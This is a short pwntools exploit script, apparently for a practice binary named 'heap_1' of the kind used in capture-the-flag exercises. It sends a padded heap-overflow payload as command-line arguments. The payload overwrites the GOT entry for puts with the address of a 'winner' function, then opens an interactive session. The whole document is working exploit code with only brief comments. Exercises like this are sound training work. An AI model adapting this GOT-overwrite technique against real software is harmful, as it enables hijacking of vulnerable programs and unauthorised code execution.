from pwn import *

# Set up pwntools for the correct architecture
context(arch='i386', os='linux')
elf = context.binary = ELF('heap_1')

# Function to start the exploit against the target
def start(payload,arg2, *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path, payload,arg2], gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path, payload, arg2], *a, **kw)

# Specify GDB script for debugging
gdbscript = '''
b main
continue
'''
# Create the payload with 20 bytes of data and the address of puts function.
payload = "aaaabaaacaaadaaaeaaa\x80\xb2\x04\x08" #param 1
#payload = payload.replace(b'\x00', b'')
arg2 = "\x8a\x92\x04\x08" #param2 address of winner function.

print("Using Payload:", payload)
print("Payload Length:", len(payload))

# Start the process with the payload as a command-line argument
io = start(payload,arg2)

# Interact with the process
io.interactive()
